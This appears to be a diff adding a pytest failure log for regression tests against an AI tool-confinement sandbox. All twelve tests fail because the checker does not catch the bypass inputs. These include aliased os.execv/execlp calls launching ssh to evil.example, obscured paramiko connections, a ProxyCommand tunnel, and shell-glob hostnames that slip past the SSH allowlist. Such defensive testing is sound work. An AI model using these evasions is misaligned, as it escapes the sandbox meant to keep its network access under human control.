@@ -1,0 +1,82 @@
+FFFFFFFFFFFF                                                             [100%]
+=================================== FAILURES ===================================
+_ test_python_bypasses[import os; os.execv('/usr/bin/ssh', ['ssh', '-F', 'none', 'evil.example'])] _
+/evidence/round3_regressions.py:17: in test_python_bypasses
+    assert _check_code_safety(code, session_id='round3') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import os; os.execv('/usr/bin/ssh', ['ssh', '-F', 'none', 'evil.example'])", session_id='round3')
+_ test_python_bypasses[from os import execlp as launch; launch('ssh', 'ssh', '-F', 'none', 'evil.example')] _
+/evidence/round3_regressions.py:17: in test_python_bypasses
+    assert _check_code_safety(code, session_id='round3') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from os import execlp as launch; launch('ssh', 'ssh', '-F', 'none', 'evil.example')", session_id='round3')
+_ test_python_bypasses[import paramiko; first = client = paramiko.SSHClient(); client.connect(hostname='evil.example')] _
+/evidence/round3_regressions.py:17: in test_python_bypasses
+    assert _check_code_safety(code, session_id='round3') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; first = client = paramiko.SSHClient(); client.connect(hostname='evil.example')", session_id='round3')
+_ test_python_bypasses[import paramiko; client, other = paramiko.SSHClient(), None; client.connect(hostname='evil.example')] _
+/evidence/round3_regressions.py:17: in test_python_bypasses
+    assert _check_code_safety(code, session_id='round3') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; client, other = paramiko.SSHClient(), None; client.connect(hostname='evil.example')", session_id='round3')
+_ test_python_bypasses[import paramiko; first = paramiko.SSHClient(); client = first; client.connect(hostname='evil.example')] _
+/evidence/round3_regressions.py:17: in test_python_bypasses
+    assert _check_code_safety(code, session_id='round3') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; first = paramiko.SSHClient(); client = first; client.connect(hostname='evil.example')", session_id='round3')
+_ test_python_bypasses[import paramiko\nclass Wrapper:\n def connect(self):\n  self.client = paramiko.SSHClient()\n  self.client.connect(hostname='evil.example')\nWrapper().connect()] _
+/evidence/round3_regressions.py:17: in test_python_bypasses
+    assert _check_code_safety(code, session_id='round3') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclass Wrapper:\n def connect(self):\n  self.client = paramiko.SSHClient()\n  self.client.connect(hostname='evil.example')\nWrapper().connect()", session_id='round3')
+_ test_python_bypasses[import paramiko; client = paramiko.SSHClient(); client.connect('approved.example', sock=paramiko.ProxyCommand('ssh -F none evil.example -W approved.example:22'))] _
+/evidence/round3_regressions.py:17: in test_python_bypasses
+    assert _check_code_safety(code, session_id='round3') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; client = paramiko.SSHClient(); client.connect('approved.example', sock=paramiko.ProxyCommand('ssh -F none evil.example -W approved.example:22'))", session_id='round3')
+________________________ test_expanded_destinations[*] _________________________
+/evidence/round3_regressions.py:24: in test_expanded_destinations
+    assert check_ssh_command_access(command,'round3') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh -F none *', 'round3')
+___________________ test_expanded_destinations[evil.?xample] ___________________
+/evidence/round3_regressions.py:24: in test_expanded_destinations
+    assert check_ssh_command_access(command,'round3') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh -F none evil.?xample', 'round3')
+__________________ test_expanded_destinations[[e]vil.example] __________________
+/evidence/round3_regressions.py:24: in test_expanded_destinations
+    assert check_ssh_command_access(command,'round3') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh -F none [e]vil.example', 'round3')
+_______________ test_expanded_destinations[{evil,other}.example] _______________
+/evidence/round3_regressions.py:24: in test_expanded_destinations
+    assert check_ssh_command_access(command,'round3') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh -F none {evil,other}.example', 'round3')
+________________ test_expanded_destinations[*@approved.example] ________________
+/evidence/round3_regressions.py:24: in test_expanded_destinations
+    assert check_ssh_command_access(command,'round3') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh -F none *@approved.example', 'round3')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round3_regressions.py::test_python_bypasses[import os; os.execv('/usr/bin/ssh', ['ssh', '-F', 'none', 'evil.example'])]
+FAILED ../evidence/round3_regressions.py::test_python_bypasses[from os import execlp as launch; launch('ssh', 'ssh', '-F', 'none', 'evil.example')]
+FAILED ../evidence/round3_regressions.py::test_python_bypasses[import paramiko; first = client = paramiko.SSHClient(); client.connect(hostname='evil.example')]
+FAILED ../evidence/round3_regressions.py::test_python_bypasses[import paramiko; client, other = paramiko.SSHClient(), None; client.connect(hostname='evil.example')]
+FAILED ../evidence/round3_regressions.py::test_python_bypasses[import paramiko; first = paramiko.SSHClient(); client = first; client.connect(hostname='evil.example')]
+FAILED ../evidence/round3_regressions.py::test_python_bypasses[import paramiko\nclass Wrapper:\n def connect(self):\n  self.client = paramiko.SSHClient()\n  self.client.connect(hostname='evil.example')\nWrapper().connect()]
+FAILED ../evidence/round3_regressions.py::test_python_bypasses[import paramiko; client = paramiko.SSHClient(); client.connect('approved.example', sock=paramiko.ProxyCommand('ssh -F none evil.example -W approved.example:22'))]
+FAILED ../evidence/round3_regressions.py::test_expanded_destinations[*] - Ass...
+FAILED ../evidence/round3_regressions.py::test_expanded_destinations[evil.?xample]
+FAILED ../evidence/round3_regressions.py::test_expanded_destinations[[e]vil.example]
+FAILED ../evidence/round3_regressions.py::test_expanded_destinations[{evil,other}.example]
+FAILED ../evidence/round3_regressions.py::test_expanded_destinations[*@approved.example]
+12 failed, 1 warning in 0.12s
